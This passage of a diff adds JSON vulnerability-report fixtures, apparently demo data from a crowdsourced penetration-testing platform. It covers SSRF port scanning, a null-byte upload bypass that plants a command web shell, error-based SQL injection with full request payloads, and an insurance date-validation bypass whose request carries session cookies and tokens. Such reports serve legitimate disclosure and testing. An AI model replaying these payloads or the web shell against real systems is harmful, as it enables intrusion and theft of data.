+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-3"
+  },
+  {
+    "id": "synack-demo-w004-2",
+    "title": "Server Side Request Forgery",
+    "tag_list": [
+
+    ],
+    "description": "Server Side Request Forgery (SSRF) attacks target internal systems behind the firewall that are normally inaccessible from the outside world (but using SSRF it's possible to access these systems).",
+    "impact": "With SSRF it's also possible to access services from the same server that is listening on the loopback interface.  An attacker can:\r\n\r\n1. Scan and attack systems from the internal network that are not normally accessible\r\n2. Enumerate and attack services that are running on these hosts\r\n3. Exploit host-based authentication services",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Improper Error Message Text",
+      "parent": "Information Disclosure"
+    },
+    "cvss_final": 0.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:N",
+    "recommended_fix": "White-listing is the best approach to preventing this attack.",
+    "exploitable_locations": [
+      {
+        "type": "other",
+        "value": "White Harbor"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-11-07T20:55:38+00:00",
+    "resolved_at": "2023-10-15T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105855,
+      "codename": "SYNACK-DEMO-W004",
+      "slug": "demoweb004",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb004"
+    },
+    "validation_steps": [
+      {
+        "id": 118791,
+        "number": 1,
+        "detail": "Login and go to settings> integration > Integrations or directly access it at https://client.scrubbed.com/integrations/new",
+        "url": "https://client.scrubbed.com/integrations/n",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118792,
+        "number": 2,
+        "detail": "In the \"Url to connect\" field, enter the http://scanme.nmap.com:22",
+        "url": "http://scanme.nmap.com:22",
+        "ip_address": null,
+        "port": 22,
+        "port_type": "TCP"
+      },
+      {
+        "id": 118793,
+        "number": 3,
+        "detail": "Click on connect, and check the response. It will be something like below\r\n \r\nwrong status line: \"SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7.1\" \r\n\r\nThis means port is open. The URL http://scanme.nmap.com:22 will cause the server to connect to scanme.nmap.com (http://scanme.nmap.com) on port 21.",
+        "url": null,
+        "ip_address": null,
+        "port": 21,
+        "port_type": "TCP"
+      },
+      {
+        "id": 118794,
+        "number": 4,
+        "detail": "Increase/decrease the port number and try to connect, for example http://scanme.nmap.com:443 \r\n The response will be \r\n\r\nNetwork is unreachable - connect(2)",
+        "url": "http://scanme.nmap.com",
+        "ip_address": null,
+        "port": 443,
+        "port_type": "TCP"
+      },
+      {
+        "id": 118795,
+        "number": 5,
+        "detail": "Note: http://scanme.nmap.com is a testing url, it has some ports open and some closed. I used this url for testing purpose only. ",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w004-2"
+  },
+  {
+    "id": "synack-demo-w003-3",
+    "title": "Remote Code Execution with Nullbyte at http://Scrubbed.com (Unrestricted File Upload)",
+    "tag_list": [
+
+    ],
+    "description": "A remote code-execution vulnerability exists because the \"media uploader\" at \"http://Scrubbed/\" fails to properly check file extensions on uploaded files.\n\nNormally, users at \"Scrubbed/\" are not allowed to upload \"ashx\" files (Microsoft .NET web handler files) because these files typically include code that is execute by the web server. The system responds with this message when users attempt to do this:\n---\n\"There were errors:\n    The specified file type has been disallowed by the administrator\"\n---\n\nA vulnerability in the web application allows an attacker to bypass this file check by adding the character \"%\" (null byte) at the end of the file extension.\n\nThis issue allows remote attackers to execute arbitrary machine code in the context of the affected web server.\n\nSystem information from the web server machine was obtained as \nProof of the RCE: \n\nhttp://Scrubbed.com/shell.ashx?cmd=systeminfo\nhttp://Scrubbed.com/shell.ashx?cmd=dir\n\nModule Vulnerable: http://Scrubbed.aspx?id=[File-ID]\n\nSystem info:\n\nHostName:Scrubbed\nOSName:MicrosoftWindowsServer2008R2Standard\nOSVersion:6.1.7601ServicePack1Build7601\nOSManufacturer:MicrosoftCorporation\nOSConfiguration:StandaloneServer\nOSBuildType:MultiprocessorFree\nRegisteredOwner:Scrubbed\nRegisteredOrganization:Scrubbed\nProductID:Scrubbed\nOriginalInstallDate:####\nSystemBootTime:#####\nSystemManufacturer:MicrosoftCorporation\nSystemModel:VirtualMachine\nSystemType:x64-basedPC\nProcessor(s):1Processor(s)Installed.\n[01]:Intel64Family6Model26Stepping5GenuineIntel~2266Mhz\nBIOSVersion:AmericanMegatrendsInc.090004,19-03-2009\nWindowsDirectory:C:\\Windows",
+    "impact": "Remote code execution is the ability for an attacker to access someone else's computing device and make changes, no matter where the device is geographically located.  In this case an attacker can steal, delete, edit data or even shutdown the server. This is a critical vulnerability because attackers have access to the whole server and it can run any command. In addition to taking over the server and its data, it is often then used to launch additional attacks to other computers reachable from the compromised hosts. Backdoor trojans are often left for later discrete access, making it difficult to know how long the compromise has existed and how much damage has been done (data exfiltration, additional compromised machines, etc.).",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Code Injection (Server-Side)",
+      "parent": "Remote Execution"
+    },
+    "cvss_final": 9.3,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:H",
+    "recommended_fix": "Make sure that the media file uploader only allows real media data. Block all null characters like \"%\" on filename inputs.If possible properly check all file content when doing an media upload.",
+    "exploitable_locations": [
+
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-11-07T20:55:13+00:00",
+    "resolved_at": "2023-10-16T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105854,
+      "codename": "SYNACK-DEMO-W003",
+      "slug": "demoweb003",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb003"
+    },
+    "validation_steps": [
+      {
+        "id": 118836,
+        "number": 1,
+        "detail": "Download \"shell.ashx.txt\" and change it to \"shell.ashx\" - Go to \"http://Scrubbed/Login.aspx\" and Login with the username and password demo:demo.",
+        "url": "http://Scrubbed",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118837,
+        "number": 2,
+        "detail": "Click on \"uploads\" and this will show  the vulnerable Media Uploader.",
+        "url": "http://scrubbed.aspx#media",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118838,
+        "number": 3,
+        "detail": "Click on \"Browser\" and try to upload \"shell.ashx\" This will send you this message attached.",
+        "url": "http://Scrubbed/editMedia.aspx",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118839,
+        "number": 4,
+        "detail": "Start Burp interception and try to upload  shell.ashx again but this time with Burp change the file extension to \"shell.as%hx\" and forward the Request (Image attached)",
+        "url": "http://Scrubbed/editMedia.aspx",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118840,
+        "number": 5,
+        "detail": "This will upload the file to http://Scrubbed/shell.ashx allowing an attacker to run Remote commands on the Webserver.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w003-3"
+  },
+  {
+    "id": "synack-demo-h001-6",
+    "title": "SQL Injection in price-order API",
+    "tag_list": [
+      {
+        "name": "Unauthorized Public Cloud Host",
+        "id": 36529
+      }
+    ],
+    "description": "When an order is placed using the scrubbed.com website, the \"scrubbed\" API is called to look up the price prior to the order being finalized.  Testing demonstrated that the /order/price API is vulnerable to an error-based SQL injection attack via the \"idx\" parameter.",
+    "impact": "A SQL injection attack typically allows an attacker to access, update, delete or create data in the relational database that stores application data. The API in question appears to limit the length of the input passed to the database, which made executing the database queries and proof-of-concept exploits more difficult.\n\nIn an effort not to impact the systems under test, only the database configuration details were retrieved.  This included retrieving the following information from the underlying server:\n\nDatabase Banner (@@version):\n\nMicrosoft SQL Server 2008 R2 (SP2) - xx.xx.xxxx.0 (X64) \nFeb  7 2014 17:23:24 \nCopyright (c) Microsoft Corporation\nExpress Edition with Advanced Services (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)\n\nuser_name()\ndbo\nguest\nsys\nPOS\n\nhost_name():\nSCRUBPOS522\n\nDB_NAME():\nmaster\nmodel\ntempdb\npos\ncontrols\nextracts\nhistory\nstore\n\n\nFile_name():\nCUSTOMER_DATA_PRODUCTION\nCUSTOMER_TRANSACTIONS_PRODUCTION\nValidation Steps",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Error-based",
+      "parent": "SQL Injection"
+    },
+    "cvss_final": 9.3,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N",
+    "recommended_fix": "All input should be sanitized prior to passing it to a database query.  Additionally SQL queries should be performed using parameterized statements.  This will ensure that the database driver can properly escape input data and limit the chance of a SQL injection vulnerability.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://scrubbed.com/order/price",
+        "protocol": null,
+        "address": null,
+        "port": null
+      },
+      {
+        "type": "ip",
+        "value": null,
+        "protocol": "tcp",
+        "address": "198.51.100.2",
+        "port": "4243"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-11-07T20:42:13+00:00",
+    "resolved_at": "2023-10-19T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105851,
+      "codename": "SYNACK-DEMO-H001",
+      "slug": "demohost01",
+      "category": "Host",
+      "link": "https://client.synack.com/assessments/demohost01"
+    },
+    "validation_steps": [
+      {
+        "id": 119075,
+        "number": 1,
+        "detail": "The following POST request can be sent to the server.  Note that a SQL query has been appended to the \"idx\" parameter.\n\n-----\n\nPOST /order/price HTTP/1.1\nHost: scrubbed.com\nConnection: keep-alive\nContent-Length: 967\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\nContent-Type: application/json; charset=UTF-8\n\n{\"Scrubbed\":{\"Address\":{\"Street\":\"123 MAIN ST\",\"City\":\"LittleTown\",\"idx\":\"'+convert (int,(@@version))+'\",\"PostalCode\":\"00000-1234\",\"Scrubbed\":\"test\",\"Type\":\"Business\",\"Name\":\"test\",\"StreetName\":\"LAKE DR\"},\"Coupons\":[],\"CustomerID\":\"0123498765--9AEF01234\",\"Email\":\"a_test_account@yahoo.com\",\"Extension\":\"123\",\"FirstName\":\"test<b>d\",\"LastName\":\"test<b>l\",\"LanguageCode\":\"en\",\"order:\"123456\",\"lead\":\"online\",\"type\":\"webapi\",\"Payments\":[],\"Phone\":\"6505551212\",\"PhonePrefix\":\"\",\"Products\":[{\"Code\":\"Scrubbed\",\"Scrubbed{\"1/1\":\"1\"}}}],\"ServiceMethod\":\"Delivery\",\"SourceOrganizationURI\":\"Scrubbed.com\",\"LocID\":\"1536\",\"Tags\":{},\"Version\":\"1.0\",\"NoCombine\":true,\"Partners\":{\"Scrubbed\":{\"Tags\":{}}},\"Scrubbed\":[],\"Scrubbed\":{\"Scrubbed\":true,\"Scrubbed\":false}}}",
+        "url": "https://scrubbed.com/order/price",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119076,
+        "number": 2,
+        "detail": "As noted in the impact steps, it is possible to query for many different values, or just attempt a full database query.  For example, the same request is modified below to return the system hostname instead:\n\n-----\n\nPOST /order/price HTTP/1.1\nHost: scrubbed.com\nConnection: keep-alive\nContent-Length: 967\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\nContent-Type: application/json; charset=UTF-8\n\n{\"Scrubbed:{\"Address\":{\"Street\":\"123 MAIN ST\",\"City\":\"LittleTown\",\"idx\":\"'+convert (int,host_name())+'\",\"PostalCode\":\"00000-1234\",\"Scrubbed\":\"test\",\"Type\":\"Business\",\"Name\":\"test\",\"StreetName\":\"Scrubbed\"},\"Scrubbed\":[],\"CustomerID\":\"0123498765--9AEF01234\",\"Email\":\"a_test_account@yahoo.com\",\"Extension\":\"123\",\"FirstName\":\"test<b>d\",\"LastName\":\"test<b>l\",\"LanguageCode\":\"en\",\"order:\"123456\",\"lead\":\"online\",\"type\":\"webapi\",\"Payments\":[],\"Phone\":\"6505551212\",\"PScrubbed\":\"\",\"Products\":[{\"Code\":\"Scrubbed\"ServiceMethod\":\"Scrubbed\",\"SourceOrganizationURI\":\"Scrubbed.com\",\"LocID\":\"1536\",\"Tags\":{},\"Version\":\"1.0\",\"NoCombine\":true,\"Scrubbed\":{\"Scrubbed\":{\"Tags\":{}}},\"Scrubbed\":[],\"Scrubbed\":{\"Scrubbed\":true,\"CalculatePotentialPoints\":false}}}",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-h001-6"
+  },
+  {
+    "id": "synack-demo-h001-4",
+    "title": "Creating retroactive insurance",
+    "tag_list": [
+
+    ],
+    "description": "There is a put call in the application process that lets users browsers write directly to the database. Most fields on this are fairly benign such as changing your previous selections. Some are more interesting like changing the state of registration or the city provided, however this will focus on the effective date of the policy to show the impact of these parameters not being checked for client side changes. The other 3 parameters are vulnerable but seem to lack sufficient business impact from what I can see about the target to be focused on.\n\nSince this was originally found, the client had created a patch in the meantime that produced an error citing \"Effective Date has been updated from //** to 03/01/2021\". This was implemented with a Delorian Time Machine token in the header. The report has been updated to reflect how to bypass this patch and show a working exploit. I have also added a video as full proof of concept in case a better patch is implemented in the mean time.\n\nPlease note that some screenshots are from the original test before the patch and reflect the TX site. This report is for the IL site, although they all operate the same",
+    "impact": "This will let an attacker create a policy retroactively. The threat is that someone has a major health crisis or event that has cost significant money. They simply go in and create a policy that shows that they were covered by UHC at that time in the past. This could create a significant financial loss",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Client Side Validation",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 6.5,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "recommended_fix": "The put calls should have a logic filter on them to prevent data from having an illogical event. The database should be filtered to prevent past dates from being entered. Additionally, the other fields should not be modifiable later such as the state, timestamp, ID or userName. Additionally, users should not be able to modify system generated data fields.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://wwww.ratchetanttestingdemo.com",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+      {
+        "http_request": "POST /shoppingcart/validation?plantype=major_medical&b=0 HTTP/1.1\nHost: retailweb-test2.TESTDEMO.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-Delorean-Time-Machine: 2021-02-07\nX-Requested-With: XMLHttpRequest\nx-dtpc: 3$517337166_715h16vUWMJCFWGOAARUPHJKFHCMMEMBPCFSTRA-0e17\nContent-Length: 1408\nOrigin: https://retailweb-test2.TESTDEMO.net\nDNT: 1  \nConnection: close\nReferer: https://retailweb-test2.TESTDEMO.net/shoppingcart/census\nCookie: JSESSIONID=0000KBLTADbDV9VRWsWNk3mHyqG:19ia6fako; dtCookie=v_4_srv_3_sn_E6BAB4B0A06F5E0B7EA1B3D1B0A94FA5_perc_100000_ol_0_mul_1_app-3Ae1434021c8dd0d9e_1; TS017f903c=01e8fb7a2a8e07d43d4220425b80eb2fcc6c92e27b80610935ac75a387fda2257900f2b1614cf57c05a93e1b4d3cd88845dec5cf75c4deec528ac04e43a93a3eb2477759c4bdeab1d99527829b6177824d2a6c5e82cc076344b4ed954bd8f7f058b584c12be3b2665a4a507576a1e8d7619751d7709f9c8bba8d6b2a8142f645947342c64c5e0616113680643e25a26e353bcaec48b1e1962c81c4d03684b44690cc2cd267e4a03281bd2b4dd3357683988b4256ae6b6d4f34b2f939818f47767f3b73d8ba41633deda07dbcde123ba8da7459808a98ff68038162992943a51acc7284e1d0ed5c9e55286c563d7e7284ed4006d2185a742b0ce2de303dacf71f321e12bf5e; rxVisitor=16127168552476LEAADDSHL2LM12C75CA5ERFA8RMB79K; dtPC=3$517337166_715h16vUWMJCFWGOAARUPHJKFHCMMEMBPCFSTRA-0e17; rxvt=1612719217534|1612716855250; dtSa=-; dtLatC=2; WT_FPC=id=2fa2dce75873227cd951612716860122:lv=1612717417276:ss=1612716860122; CurrentVisit=1; Username_token_cookie=f163a973-2c6a-4c18-99e9-f20932018287; SELF_SERVICE_TOKEN=eyJ0eXAiOiJKV1QiLCJjdHkiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.ZXlKMGVYQWlPaUpLVjFRaUxDSmxibU1pT2lKQk1USTRRMEpETFVoVE1qVTJJaXdpWVd4bklqb2lVbE5CTVY4MUluMC5mVHo5cUdmcEpvNGxwaXpmYWUybC1CeDlQeFpOXzM4dFQwNDRiSmotX3NqWmpFdzJjc1p4cEl1NDNsVmFLSC1yUzF6cjluQUVTQUlGMDhGSm1QY0lRb3VobHFGMVdFcTVFTWhsZzlmelp4d2JDWk85bll2bmJVTG9pYkRZdWFqN2kzUkJrbnE5bG1QR2pPR2h1ZWxCaDZZaUtNTlNaQTVXRXE0TmF6V1pCeHpHWmM0bFdQX0VRRkpVM3ZNamhiWWg1U2pMa2tNWGszb1hKVFg4MUFsQXBjQWU3bktaX0lyczh2RnJvLXBWLURIQWZxUGpxRmYzaERRUnIyYjZHeUVnOWVkNWpEYWJRaTZNVXVTZjlRVE1qOU4zeXdVZlkzc2ZGM2JVeVR1cGdMWjFiRy1BUDhCNUg1QTNYalpvamsxN0lDcDM3VWtzLTNFTk9UUHBGRC1fMkEubmhnVm5hcURJQnZaRmZnaFRZR0VJZy5Zc3dtX2tpX1l2MzBaLVkzQ2xCX1luSHB0Q3lSang2ZkFUVE9taHRlRXF6UVRtNGlKcmFSUjhUam1Wci1sOGxDSjJrNjFQbUtLdnJ3ZlE4Uk10QVM3VmpDaUZzQWxGNGpDbTdlVmVGaXJVM2lRbEVXNkRQUW5SWk9LWmdfMXlfMl9rQjFXc093bXdaRERqT3ZERDViSlY0dXhDd1dVZ3F2Q24wYjhfd2xoVWIwOVkwT1dYeXdRM0MwS0pDWmtYT3hIbktSSWhZdmliZU81Q3JGM0lzbVB3dVg2eFRld1pqMkNsRURfeHI1ZzdodjhPdWVTaU8xYWNUUngxcnhIdG15dXlMV01RSGJTaGJOZE9DV1ByRE5ONUdGZTZhdzVDYTJ4TFd2M1RtdTZVLVVCaW5lNnZ3ai1Uc283WkFDMkpMMUViZnpCY3dqTlc0amxhM3RnWWNWOXdYU1kwVXpsSGNFbHpqT2I5WE02eU1NdVN2aHIyb3FWYjdCeUszWm9EMnN3Z2JHM0ltUHZPdVBCN0pvX2duQVZCd0pLXzctNGZXNU8zNTFQZzdzb3RmVXhQeTh0SnM4QkMxWU9XMXhBYnNGZXRkNWVfRVhxc1lwaFFTakJYTjJuVWZmTVJlUWlIN0l0NlhRb01VUlljRk9LRVQ4UVlsTFdiQk9Rc29id05SYlJSQ0hxUW5sTEVYZEhQcEdfTm5KTTVzUWk5N2FEWWJycjUzcDJ2VmRPT0hPejNCNjFTV1VoeFZTMWpmQXRwNk02STUxNEFqa2hzYVRxempydVM0c3VPNFpaZkdJN1VaYjd5ck5Pc1Izb05McG16YWhDOGU3LUJ3dk50WjJDTUhCTUJPZXhXM3RlUXVHbmNlQV9Ba1BMVjczazR2U0pCN25YVmVjREpuSnczbVlKX3hlMHRTa1lCUHVrSWY3RkFEbC1QSml4QnAyMmkyLVdxUWNMUE1tUVFqWTN5YXBOVVhSY29tcUpKdU05akF3bEZSZWVSUzFjUmd2b29RQU5GZDF5bmJNQjJIak1fcXNmdmFVd1FpVHZYdW03RllveWxXZnRiampGZ2dvbW54SHI5bVJWZHN1eFh5TXE3V3dCSGpYbzh2TzNlSU5LMDBqcTFrSkdqSXl6SG14TWV5NzZ4aEV5WVBZdVljRy0yR0xMSjNjbGlIVlRJX0o5Yk04OXZZRTJiZlRXTjFPclJBQklZSTVNc1NHeHlNSWFPdmQ5Zmd6ekZKVXpkaWR2VVJsd1ZfMjFNMmt0U29OZ1ZfSzk4QVBHQlhDR3JrV0lzSTN2MHN4bkc4MW9nZUhHU21MNmVNeXlLRnJrMWJxREppUW5KT2xDRDk3ZDVDeTRQekFIOTVFdm5USHBMalVUVndtT3V4YTdheEt3Q3V1QWZWM3otWXpET0RUbUNUanFJdUlBTm1HM3dDbGx0WUpXSGRqYTFUZHBvc1dwelNQR3VVc3FhQ2ZTTldYcXNlVjhhbW5hbDNVOXlxWGFsVk9CcF81TGRrQXJnbVlYc2JjdWxBc3MxZGhQa1c4QlVWWXpvT0dNZXVfTlFyMXJfWWVVcFZhcmxTcnY0OEFyWXQ2UTBEUzAzc2hqdlRXOF80T2FJdFExLTM2eWNRWndqcU9HSW44N1RncHdqVThBUGRIM3FGOGFnSVVDbXpKSjJWd3pBYWlpSThDYVBJdlFHSF9MNzZfSVZMSUtqYXNUNnlEV3ZubkdlbnN1a21HN2M2Y2xLWmZQOHVwcHppOUwybDZ6S2M5VWN0Y2lZWk5tbWgtYkUzeFZyQ2FudmhPVVUtWTdVTWd6Q3FIU1BOLTJjUWtQcnNZWVJsZ3FSMWJZZXB3d2djS3NJTUdlTzBYTUNaZDNPZHh5UWwwdDM0WmRtTVBVeHhwZEw3RkllYXp0eWdaX3RsS05oajFvYXFFdm42UGdtZ25XYUppLWtnQUtCdTZ0blNiTWxzZVZncUE5RlpjRTk1MGVXRXhBc2FseUJ2aDJoZ3cyeEU3NldaUWZEVW5XemFNU0NZWFZISUI2NHcxU2JmN183aU9yWDNNdGNwal9ZeXp0OGFLX3FtalN0UzJRX1JIOFJOVVZ5NzF3aE5mUS1vb0FXejhTUWpCUWZ3NWxxSGVrZFhtTDJ4RG5DZkd2OXV4QTRYeFhZWUhuVkNDSnN4WTBUTy1nbzFpbmw0OTc2bmh4dTFxQXR5VDJHYmFOWVZ4R3M1dFdRbVU4LUpNQ0JSQTdQaksza19RdzlFRFFWUkRteEJ6SUNUeDNVMXl4YkNfekpBblczbEpHWC1PVEN2Wmk3Ny0zamx0cDZKMUJTeEFmYmVxQmtBVlpHU0dQWWVNRk03SzZwa1JpYzBXdndITlotSEJTbU1xWm5TWWR5QW1nM1dhdTVtSTlWaDhTNWVxUHZZN1dDR1UyaDhDd1IwNHh2SEhNclIyZ0Vyem9JNGZyYTg0VWNReXZvZF9obVkzUFU2R3Fxem0yZmIzQWc5cFdZbFJfaGd5c2FhYVhYTHRTRlJodmRiWlZ2ck5udWRpV0tlT1MzY2FqLTRldXVJUllmX0ZRanA0bXUyZXh6NVA0bVhoSDZ0Mzc4c2RGdzQxQ1dDOHZhUEJlMVJpUjFlXzZmVGFlUFJYNGlwa3RycmZMdDJMaDEtd2JVTjhmZndYdG02Q18yN1djVXVvOGd2V0RocnBiLUNwZmYxR0IycFhCM3d6VGFnNlFJOThCcG1uNkl3OWl6N2tDZlYxb1dGRUVhWFBnaldFMHhuVGM2ZjhaMERrYzAtMWFHSDhGaEEud0wtdUU3UEJHWHBieXNPa3JKSEpCUQ.aOyHhsHBRE1GMJtSCwBxVibXjzpOZRY-JUVVW0g-Asw; USERNAME=SYNACKtesting; RSC_GENERAL=%7B%22hasDismissedTCE%22%3Atrue%7D; APIGEE_OAUTH2_TOKEN=f163a973-2c6a-4c18-99e9-f20932018287; SHOPPER_ID=426772; LOGGED_IN=true; EXCHANGE_SYNC_TRACKER=%7B%22source%22%3A%22Exchange%20Synchronization%22%2C%22partnerAssignedConsumerID%22%3A%2204.HCS.IL*.309.289%22%2C%22userType%22%3A%22Consumer%22%2C%22stateExchangeCode%22%3A%22%22%2C%22subsidyAmountAvailable%22%3Anull%2C%22subsidyAmountApplied%22%3Anull%2C%22subsidyEligible%22%3Anull%2C%22effid%22%3Anull%7D\n\n{\"shoppingOnExchange\":false,\"plans\":[],\"buckets\":[{\"type\":\"family\",\"coverageDate\":\"2021-02-01\",\"id\":0,\"zip\":\"60606\",\"county\":\"TEST\",\"countyCode\":\"17031\",\"Exchange\":false,\"applicants\":[{\"type\":\"primary\",\"id\":0,\"active\":true,\"tobacco\":false},{\"type\":\"dependent\",\"id\":1,\"active\":false,\"tobacco\":false}]}],\"applicants\":[{\"id\":0,\"birthdate\":\"2000-01-01\",\"gender\":\"male\",\"tobacco\":false,\"nickname\":\"SynackTest\",\"requiresReview\":false,\"type\":\"primary\",\"onExchange\":false,\"exchangeEligible\":false,\"chipEligible\":false,\"aptcEligible\":false,\"medicaidEligible\":false,\"planMetalLevelOption\":null,\"applicantMetals\":null},{\"type\":\"dependent\",\"birthdate\":\"2000-01-01\",\"gender\":\"male\",\"tobacco\":false,\"nickname\":\"SynacktestMK\",\"disability_requirements_answer\":false,\"disability_notice_answer\":false,\"requiresReview\":false,\"onExchange\":false,\"exchangeEligible\":false,\"chipEligible\":false,\"csrEligible\":false,\"aptcEligible\":false,\"medicaidEligible\":false,\"planMetalLevelOption\":null,\"Metals\":null,\"requestingMedicare\":false,\"id\":1}],\"state\":\"IL\",\"eligibilityComplete\":false,\"userUpdatedEffectiveDate\":false,\"exchangeEligibility\":false,\"O65AgentCertified\":false,\"account\":{\"userName\":\"SYNACKtesting\",\"email\":\"SRT@synack.com\"},\"locked\":false,\"timestamp\":\"2021-02-07\",\"primaryKey\":426772,\"agents\":[],\"id\":\"426772\",\"agent\":null,\"shopping\":\"major_medical\",\"status\":200}",
+        "attack_payload": "Past date of attacker's choice. I used 01-01-2021 as mine, but it's arbitrary.",
+        "vuln_param": "coverageStar, timestamp, state, id"
+      }
+    ],
+    "updated_at": "2023-10-24T12:26:15+00:00",
+    "resolved_at": "2023-10-14T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105851,
+      "codename": "SYNACK-DEMO-H001",
+      "slug": "demohost01",
+      "category": "Host",
+      "link": "https://client.synack.com/assessments/demohost01"
+    },
+    "validation_steps": [
+      {
+        "id": 118841,
+        "number": 1,
